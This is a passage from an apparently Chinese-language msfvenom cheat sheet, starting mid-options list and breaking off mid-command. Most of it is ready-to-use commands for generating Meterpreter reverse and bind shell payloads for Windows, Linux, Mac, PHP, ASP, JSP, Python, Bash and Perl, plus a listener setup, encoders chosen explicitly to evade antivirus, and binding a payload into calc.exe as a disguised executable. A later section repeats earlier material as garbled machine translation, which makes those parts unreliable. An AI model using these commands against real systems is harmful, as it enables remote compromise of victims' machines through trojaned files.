<p>-f, --format&lt;format&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定输出格式 (使用 --help-formats 来获取<span lang="EN-US">msf</span>支持的输出格式列表<span lang="EN-US">)</span></p>
<p>-e, --encoder[encoder]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定需要使用的encoder（编码器）</p>
<p>-a, --arch&lt;architecture&gt;&nbsp; 指定payload的目标架构</p>
<p>&nbsp;&nbsp;&nbsp; --platform&nbsp;&nbsp; &lt;platform&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定<span lang="EN-US">payload</span>的目标平台</p>
<p>-s, --space&lt;length&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 设定有效攻击荷载的最大长度</p>
<p>-b, --bad-chars&lt;list&gt;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设定规避字符集，比如<span lang="EN-US">: &amp;#039;\x00\xff&amp;#039;</span></p>
<p>-i, --iterations &lt;count&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定<span lang="EN-US">payload</span>的编码次数</p>
<p>-c, --add-code&lt;path&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定一个附加的win32 shellcode文件</p>
<p>-x, --template&lt;path&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定一个自定义的可执行文件作为模板</p>
<p>-k, 
--keep&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 保护模板程序的动作，注入的payload作为一个新的进程运行</p>
<p>--payload-options&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 列举payload的标准选项</p>
<p>-o, --out&lt;path&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 保存payload</p>
<p>-v, --var-name &lt;name&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定一个自定义的变量，以确定输出格式</p>
<p>&nbsp;&nbsp;&nbsp; 
--shellest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 最小化生成payload</p>
<p>-h, 
--help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 查看帮助选项</p>
<p>--help-formats&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查看<span lang="EN-US">msf</span>支持的输出格式列表</p>
<p>&nbsp;</p>

</div>
<p>2.生成payload 格式说明</p>
<p>（1）生成不经过编码的普通payload（不编码<span lang="EN-US&gt;">-&gt;</span>生成内容固定-&gt;直接被杀）</p>
<div>
<p>#格式</p>
<p>msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f
&lt;format&gt; -o &lt;path&gt;</p>
<p>#实例</p>
<p>msfvenom –p windows/meterpreter/reverse_tcp –f c –o 1.c</p>

</div>
<p>（2）经过编码器处理后生成payload</p>
<div>
<p>#格式</p>
<p>msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i
&lt;encoder times&gt; -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;</p>
<p>#实例</p>
<p>msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e
x86/shikata_ga_nai –f exe –o C:\back.exe</p>

</div>
<p>（3）捆绑到正常文件后生成payload（暂未测试是否可加<span lang="EN-US&gt;">-e</span>参数）</p>
<div>
<p>Msfvenom –p windows/meterpreter/reverse_tcp –platform windows
–a x86 –x C:\calc.exe –k –f exe –o C:\shell.exe</p>

</div>
<p><span lang="EN-US">-p [</span>指定攻击载荷名称]</p>
<p>生成payload至少需指定<span lang="EN-US&gt;">-p </span>和 -f，除了自带的那些payload外。<span lang="EN-US&gt;">-p -</span>可指定自定义的payload ，如：</p>
<div>
<p>cat payload_file.bin | msfvenom -p - -a x86 --platform
win -e x86/shikata_ga_nai -f raw</p>

</div>
<p><span lang="EN-US">#</span>暂未测试</p>
<div>
<p>cat 1.exe | msfvenom -p - -a x86 --platform win -e
x86/shikata_ga_nai -f exe -o 2.exe</p>

</div>
<p><span lang="EN-US">-f [</span>指定payload的输出格式<span lang="EN-US&gt;">]</span></p>
<p>按需要的格式进行输出：<br>十六进制hex编码形式 \x0a，如果用<span lang="EN-US&gt;">python</span>写exploit，用-f
python得到python代码。如果用python写<span lang="EN-US&gt;">exploit</span>，用-f c得到c代码。生成一个<span lang="EN-US&gt;">exe</span>格式的payload，如：<br>msfvenom -p
windows/meterpreter/bind_tcp -f exe</p>
<p><span lang="EN-US">msf</span>支持的输出格式</p>
<div>
<p>msfvenom --help-formats</p>
<p>Executable formats</p>
<p>&nbsp;&nbsp;&nbsp; asp, aspx,
aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small,
hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd,
psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war</p>
<p>Transform formats</p>
<p>&nbsp;&nbsp;&nbsp; bash, c,
csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py,
python, raw, rb, ruby, sh, vbapplication, vbscript</p>

</div>
<p>3.options usage</p>
<div>
<p>查看支持的<span lang="EN-US">payload</span>列表：</p>
<p>msfvenom -l payloads</p>
<p>&nbsp;</p>
<p>Framework Payloads (486 total)</p>
<p>==============================</p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp; NameDescription</p>
<p>&nbsp;&nbsp;&nbsp; ---------------</p>
<p>aix/ppc/shell_bind_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Listen for a
connection and spawn a command shell</p>
<p>aix/ppc/shell_find_port&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Spawn a shell on
an established connection</p>
<p>aix/ppc/shell_interact&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Simply execve /bin/sh (for inetd 
programs)</p>
<p>aix/ppc/shell_reverse_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Connect back to
attacker and spawn a command shell</p>
<p>android/meterpreter/reverse_http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Run a meterpreter server in
Android. Tunnel communication over HTTP</p>
<p>android/meterpreter/reverse_https&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Run a meterpreter server in
Android. Tunnel communication over HTTPS</p>
<p>android/meterpreter/reverse_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Run a meterpreter server
in Android. Connect back stager</p>
<p>android/meterpreter_reverse_http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Connect back to attacker
and spawn a Meterpreter shell</p>
<p>android/meterpreter_reverse_https&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Connect back to attacker and
spawn a Meterpreter shell</p>
<p>android/meterpreter_reverse_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Connect back to the
attacker and spawn a Meterpreter shell</p>
<p>&nbsp;&nbsp;&nbsp; ...</p>
<p>&nbsp;</p>
<p>查看支持的输出文件类型：</p>
<p>msfvenom --help-formats</p>
<p>查看支持的编码方式：<span lang="EN-US">(</span>为了达到免杀的效果<span lang="EN-US">)</span></p>
<p>msfvenom -l encoders</p>
<p>查看支持的空字段模块：<span lang="EN-US">(</span>为了达到免杀的效果<span lang="EN-US">)</span></p>
<p>msfvenom -l nops</p>

</div>
<p>4.常用的payload</p>
<div>
<p>1.命令格式:</p>
<p>msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f
&lt;format&gt; -o &lt;path&gt;</p>
<p>Binaries：</p>
<p>2.Linux:</p>
<p>反向连接</p>
<p>msfvenom -p linux/x86/meterpreter/reverse_tcp
LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt;
shell.elf</p>
<p>正向连接</p>
<p>msfvenom -p linux/x86/meterpreter/bind_tcp
LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf
&gt; shell.elf</p>
<p>&nbsp;</p>
<p>3.Windows:</p>
<p>msfvenom -p windows/meterpreter/reverse_tcp
LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt;
shell.exe</p>
<p>&nbsp;</p>
<p>4.Mac:</p>
<p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP
Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</p>
<p>Web Payloads：</p>
<p>5.PHP:</p>
<p>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP
Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</p>
<p>cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr
-d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</p>
<p>&nbsp;</p>
<p>6.ASP:</p>
<p>msfvenom -p windows/meterpreter/reverse_tcp
LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt;
shell.asp</p>
<p>&nbsp;</p>
<p>7.JSP:</p>
<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP
Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</p>
<p>&nbsp;</p>
<p>8.WAR:</p>
<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP
Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.wa</p>
<p>Scripting Payloads：</p>
<p>9.Python:</p>
<p>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP
Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</p>
<p>&nbsp;</p>
<p>10.Bash:</p>
<p>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP
Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</p>
<p>&nbsp;</p>
<p>11.Perl:</p>
<p>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP
Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</p>
<p>Shellcode：</p>
<p>12.Linux Based Shellcode:</p>
<p>msfvenom -p linux/x86/meterpreter/reverse_tcp
LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f
&lt;language&gt;</p>
<p>&nbsp;</p>
<p>13.Windows Based Shellcode:</p>
<p>msfvenom -p windows/meterpreter/reverse_tcp
LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f
&lt;language&gt;</p>
<p>&nbsp;</p>
<p><span lang="EN-US">14.Mac Based Shellcode:</span></p>
<p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP
Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</p>
<p>15.Handlers：</p>
<p>use exploit/multi/handler</p>
<p>&nbsp;&nbsp; set PAYLOAD
&lt;Payload name&gt;</p>
<p>&nbsp;&nbsp; set LHOST
&lt;LHOST value&gt;</p>
<p>&nbsp;&nbsp; set LPORT
&lt;LPORT value&gt;</p>
<p>&nbsp;&nbsp; set
ExitOnSession false</p>
<p>&nbsp;&nbsp; exploit -j -z</p>

</div>
<p>5.生成有效载荷格式说明</p>
<div>
<p>生成不经过编码的普通净荷（不编码<span lang="EN-US"> - &gt;</span>生成内容固定<span lang="EN-US"> - &gt;</span>直接被杀）</p>
<p>#格式</p>
<p>msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f
&lt;format&gt; -o &lt;path&gt;</p>
<p>#实例</p>
<p>msfvenom –p windows/meterpreter/reverse_tcp –f c –o 1.c</p>
<p>经过编码器处理后生成的有效载荷</p>
<p>#格式</p>
<p>msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i
&lt;encoder times&gt; -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;</p>
<p>#实例</p>
<p>msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e
x86/shikata_ga_nai –f exe –o C:\back.exe</p>
<p>捆绑到正常文件后生成有效载荷（暂未测试是否可加<span lang="EN-US">-e</span>参数）</p>
<p>Msfvenom –p windows/meterpreter/reverse_tcp –platform
windows –a x86 –x C:\calc.exe –k –f exe –o C:\shell.exe</p>
<p>-p [指定攻击载荷名称]</p>
<p>生成有效负荷至少需指定<span lang="EN-US">-p</span>和<span lang="EN-US">-f</span></p>
<p>除了自带的那些有效载荷外<span lang="EN-US"><br>
-p -</span>可指定自定义的有效载荷，如：</p>
<p>cat payload_file.bin | msfvenom -p - -a x86 --platform
win -e x86/shikata_ga_nai -f raw</p>
<p>#暂未测试</p>
<p>cat 1.exe | msfvenom -p - -a x86 --platform win -e
x86/shikata_ga_nai -f exe -o 2.exe</p>
<p>-f [指定有效载荷的输出格式<span lang="EN-US">]</span></p>
<p>按需要的格式进行输出：<span lang="EN-US"><br></span>十六进制十六进制形式编码\x0a<br>如果用蟒写利用，用-f python得到蟒代码。<br>如果用蟒写利用，用-f c得到Ç代码。</p>
<p>生成一个<span lang="EN-US">EXE</span>格式的有效载荷，如：<span lang="EN-US"><br>
msfvenom -p windows/meterpreter/bind_tcp -f exe</span></p>
<p>无国界医生支持的输出格式</p>
<p>msfvenom --help-formats</p>
<p>Executable formats</p>
<p>&nbsp;&nbsp;&nbsp; asp, aspx,
aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small,
hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net,
psh-reflection, vba, vba-exe, vba-psh, vbs, war</p>
<p>Transform formats</p>
<p>&nbsp;&nbsp;&nbsp; bash, c,
csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py,
python, raw, rb, ruby, sh, vbapplication, vbscript</p>
<p>- 一个x64</p>
<p>-a x86&nbsp;<br>
-a x86_64</p>
<p>msfvenom -p windows/meterpreter/bind_tcp --help-platform</p>
<p>&nbsp;</p>
<p>Platforms</p>
<p>&nbsp;&nbsp;&nbsp; aix, android,
bsd, bsdi, cisco, firefox, freebsd, hardware, hpux, irix, java, javascript,
linux, mainframe, multi, netbsd, netware, nodejs, openbsd, osx, php, python,
ruby, solaris, unix, windows</p>
<p>-a不指定也可以，可在-p后的有效载荷名称中明确指定的建筑，如：</p>
<p>msfvenom -p linux/x86/exec CMD=/bin/sh</p>
<p>此有效载荷指定了参数<span lang="EN-US">CMD&nbsp;<br></span>查看某个有效载荷具体需要哪些参数（必需是是则必需该参数）<br>
msfvenom -p linux/x86/exec --payload-options</p>
<p>对有效载荷进行编码</p>
<p>1.规避特殊字符-b'/ x00一个特殊字符列表<span lang="EN-US">'</span></p>
<p>无国界医生会自动找一个合适的编码器规避有效载荷中的这些<span lang="EN-US">“</span>坏字符<span lang="EN-US">”</span>：<span lang="EN-US"><br>
msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw</span></p>
<p>Found 10 compatible encoders</p>
<p>Attempting to encode payload with 1 iterations of
x86/shikata_ga_nai</p>
<p>不同的函数，有不同的规避字符：<span lang="EN-US"><br></span>如获取需要就避免/x0a<br>如scanf函数更严格，空白不允许符<br>如产生一段高管的shellcode的</p>
<p>2.用-e选项指定编码器的编码器，如：</p>
<p>msfvenom -p windows/meterpreter/bind_tcp -e
x86/shikata_ga_nai -f raw</p>
<p>默认的输出格式是原始的，直接输出有效载荷的字符（含乱码），常加参数<span lang="EN-US">-o</span>写到文件中。</p>
<p>3.使用-i进行选项对话多次编码<span lang="EN-US"><br></span>迭代编码也许会有规避杀毒软件的作用英文，但这不是真正的免杀。</p>
<p>迭代编码例子：<span lang="EN-US"><br>
msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3</span></p>
<p>无国界医生组织中所有的编码器：</p>
<p>msfvenom -l encoders</p>
<p>&nbsp;</p>
<p>Framework Encoders</p>
<p>==================</p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp; 
Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Rank&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Description</p>
<p>&nbsp;&nbsp;&nbsp; 
----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------</p>
<p>&nbsp;&nbsp;&nbsp; 
cmd/echo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 good&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Echo Command Encoder</p>
<p>cmd/generic_shmanual&nbsp;&nbsp;&nbsp;&nbsp; Generic Shell Variable
Substitution Command Encoder</p>
<p>&nbsp;&nbsp;&nbsp; 
cmd/ifs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 low&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Generic ${IFS} 
Substitution Command
Encoder</p>
<p>&nbsp;&nbsp;&nbsp; 
cmd/perl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 normal&nbsp;&nbsp;&nbsp;&nbsp; Perl Command Encoder</p>
<p>&nbsp;&nbsp;&nbsp; 
cmd/powershell_base64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
excellent&nbsp; Powershell Base64 Command Encoder</p>
<p>cmd/printf_php_mqmanual&nbsp;&nbsp;&nbsp;&nbsp; printf(1) via PHP
magic_quotes Utility Command Encoder</p>
<p>generic/eicarmanual&nbsp;&nbsp;&nbsp;&nbsp; The EICAR Encoder</p>
<p>generic/none&nbsp; 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;
 The "none" Encoder</p>
<p>mipsbe/byte_xorinormal&nbsp;&nbsp;&nbsp;&nbsp; Byte XORi Encoder</p>
<p>mipsbe/longxornormal&nbsp;&nbsp;&nbsp;&nbsp; XOR Encoder</p>
<p>mipsle/byte_xorinormal&nbsp;&nbsp;&nbsp;&nbsp; Byte XORi Encoder</p>
<p>mipsle/longxor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;
 XOR Encoder</p>
<p>&nbsp;&nbsp;&nbsp; 
php/base64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 great&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP Base64 Encoder</p>
<p>ppc/longxornormal&nbsp;&nbsp;&nbsp;&nbsp; PPC LongXOR Encoder</p>
<p>ppc/longxor_tagnormal&nbsp;&nbsp;&nbsp;&nbsp; PPC LongXOR Encoder</p>
<p>sparc/longxor_tag&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;normalSPARC DWORD XOR Encoder</p>
<p>&nbsp;&nbsp;&nbsp; 
x64/xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 normal&nbsp;&nbsp;&nbsp;&nbsp; XOR Encoder</p>
<p>x64/zutto_dekirumanual&nbsp;&nbsp;&nbsp;&nbsp; Zutto Dekiru</p>
<p>x86/add_submanual&nbsp;&nbsp;&nbsp;&nbsp; Add/Sub Encoder</p>
<p>x86/alpha_mixedlow&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;Alpha2 Alphanumeric Mixedcase Encoder</p>
<p>x86/alpha_upperlow&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Alpha2 Alphanumeric
Uppercase Encoder</p>
<p>x86/avoid_underscore_tolowermanual&nbsp;&nbsp;&nbsp;&nbsp; Avoid
underscore/tolower</p>
<p>x86/avoid_utf8_tolowermanual&nbsp;&nbsp;&nbsp;&nbsp; Avoid UTF8/tolower</p>
<p>&nbsp;&nbsp;&nbsp; 
x86/bloxor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 manual&nbsp;&nbsp;&nbsp;&nbsp; BloXor - A Metamorphic Block Based XOR
Encoder</p>
<p>x86/bmp_polyglotmanual&nbsp;&nbsp;&nbsp;&nbsp; BMP Polyglot</p>
<p>x86/call4_dword_xornormal&nbsp;&nbsp;&nbsp;&nbsp; Call+4 Dword XOR
Encoder</p>
<p>x86/context_cpuid&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 manual&nbsp;&nbsp;&nbsp;&nbsp; CPUID-based Context Keyed Payload 
Encoder</p>
<p>x86/context_statmanual&nbsp;&nbsp;&nbsp;&nbsp; stat(2)-based Context
Keyed Payload Encoder</p>
<p>x86/context_timemanual&nbsp;&nbsp;&nbsp;&nbsp; time(2)-based Context
Keyed Payload Encoder</p>
<p>x86/countdown&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;
 Single-byte XOR Countdown Encoder</p>
<p>x86/fnstenv_movnormal&nbsp;&nbsp;&nbsp;&nbsp; Variable-length
Fnstenv/mov Dword XOR Encoder</p>
<p>x86/jmp_call_additivenormal&nbsp;&nbsp;&nbsp;&nbsp; Jump/Call XOR Additive
Feedback Encoder</p>
<p>x86/nonalpha&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;low&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Non-Alpha Encoder</p>
<p>x86/nonupperlow&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Non-Upper Encoder</p>
<p>x86/opt_submanual&nbsp;&nbsp;&nbsp;&nbsp; Sub Encoder (optimised)</p>
<p>x86/servicemanual&nbsp;&nbsp;&nbsp;&nbsp; Register Service</p>
<p>x86/shikata_ga_nai&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;excellent&nbsp; 
Polymorphic XOR Additive Feedback Encoder</p>
<p>x86/single_static_bitmanual&nbsp;&nbsp;&nbsp;&nbsp; Single Static Bit</p>
<p>x86/unicode_mixedmanual&nbsp;&nbsp;&nbsp;&nbsp; Alpha2 Alphanumeric
Unicode Mixedcase Encoder</p>
<p>x86/unicode_uppermanual &nbsp;&nbsp;&nbsp;&nbsp;Alpha2 Alphanumeric
Unicode Uppercase Encoder</p>
<p>-x指定一个模板文件（“捆绑<span lang="EN-US">”payload</span>到这个正常的可执行文件）</p>
<p>msfvenom使用的模板文件保存在目录<span lang="EN-US">msf/data/templates</span></p>
<p>-x calc.exe&nbsp;<br>捆绑有效负载到正常文件（模板文件=宿主文件=自定义的可执行文件）</p>
<p>使用<span lang="EN-US">-x</span>选项指定你自己的模板文件（如<span lang="EN-US">EXE</span>等），如：<span lang="EN-US"><br></span>使用窗户下的CALC.EXE作为模板文件，生成有效载荷：</p>
<p>msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f
exe &gt; new.exe</p>
<p>注意，在<span lang="EN-US">win x64</span>下使用自定义的<span lang="EN-US">x64</span>的模板文件（如<span lang="EN-US">exe</span>等）创建<span lang="EN-US">x64</span>的有效载荷时，输出格式必须要写<span lang="EN-US">-f exe-only</span>而不能写-f exe<br>（请注意：如果您想创建一个带有自定义Windows的<span lang="EN-US">x64</span>自定义模板，然后而不是<span lang="EN-US">exe</span>格式，您应该使用<span lang="EN-US">exe-only :)</span></p>
<p>msfvenom -p windows/x64/meterpreter/bind_tcp -x
/tmp/templates/64_calc.exe -f exe-only &gt; /tmp/fake_64_calc.exe</p>
<p>-x选项经常和-k选项一起用，它允许您从模板中将有效载荷作为新的线程运行。但是它目前只支持较老的系统，如<span lang="EN-US">x86 Windows XP</span>。<br>（-x标志通常与-k标志配对，这使您可以将模板中的有效负载作为新线程运行。但是，目前这只适用于较旧的<span lang="EN-US">Windows</span>机器，例如<span lang="EN-US">x86 Windows XP</span>。）</p>
<p>&nbsp;</p>

</div>
<p>6.payload加编码</p>
<p>命令格式：</p>
<p>msfvenom -p &lt;payload&gt; &lt;payload options&gt; -a &lt;arch&gt;
--platform &lt;platform&gt; -e &lt;encoder option&gt; -i &lt;encoder times&gt;
-b &lt;bad-chars&gt; -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;</p>
<p>常用编码：</p>
<p>x86/shikata_ga_nai</p>
<p>cmd/powershell_base64</p>
<p>例子：</p>
<p>msfvenom -p
